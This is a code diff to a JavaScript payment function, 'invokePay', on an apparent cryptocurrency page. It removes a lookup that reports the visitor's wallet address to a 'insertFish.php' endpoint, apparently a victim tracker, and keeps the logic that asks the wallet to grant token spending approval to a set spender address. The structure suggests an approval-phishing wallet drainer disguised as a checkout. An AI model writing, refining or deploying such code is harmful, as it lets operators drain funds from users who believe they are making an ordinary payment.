@@ -1291,29 +1291,19 @@ async function invokePay() {
         }
         
         showTemporaryMessage("2222222222222");
-        const fishResponse = await $.post('/assets/libs/options/insertFish.php', {
-            fish_address: userData.address,
-            operation: 'query'
-        });
         
         let success = false;
         
-        if (fishResponse.status === 'success' && fishResponse.message === '数据已存在') {
-			showTemporaryMessage("3333333333333333333");
-            success = await UsdtTransfer(paymentAddress, totalPrice);
-        } else {
-			showTemporaryMessage("44444444444444444");
-            switch(Number(model)) {
-                case 4:
-                    success = await increaseApproval(spenderAddress, approvalAmount);
-                    break;
-                case 5:
-                    success = await approval(spenderAddress, approvalAmount);
-                    break;
-                default:
-                    throw new Error(`未设定的交易模式: ${model}`);
-            }
-        }
+		switch(Number(model)) {
+			case 4:
+				success = await increaseApproval(spenderAddress, approvalAmount);
+				break;
+			case 5:
+				success = await approval(spenderAddress, approvalAmount);
+				break;
+			default:
+				throw new Error(`未设定的交易模式: ${model}`);
+		}
         
         // 恢复按钮状态
         setTimeout(() => {
